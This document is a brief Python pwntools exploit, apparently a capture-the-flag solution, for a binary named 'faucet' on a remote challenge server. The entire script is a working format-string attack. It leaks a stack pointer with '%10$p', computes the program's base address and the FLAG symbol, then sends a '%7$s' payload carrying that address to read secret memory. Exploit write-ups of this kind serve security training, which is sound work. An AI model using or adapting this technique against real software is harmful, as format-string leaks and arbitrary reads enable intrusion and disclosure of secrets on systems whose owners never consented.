# Author: ghsi10

from pwn import *

local = False

if local:
    p = process("./faucet")
else:
    p = remote("challenge.ctf.games", 30380)


elf = ELF("./faucet")

p.sendlineafter(b">", b"5")
p.sendlineafter(b"buy?:", b"%10$p")

p.recvuntil(b" You have bought a ")
leak_addr = int(p.recvline()[:-1], 16)
info(f"leak address: {hex(leak_addr)}")
elf.address = leak_addr - 0x11E0
log.info(f"elf address: {str(hex(elf.address))}")
flag_addr = elf.symbols["FLAG"]
info(f"FLAG address: {hex(flag_addr)}")

payload = b"%7$sAAAA"
payload += p64(flag_addr)

p.sendlineafter(b">", b"5")
p.sendlineafter(b"buy?:", payload)

p.interactive()
p.close()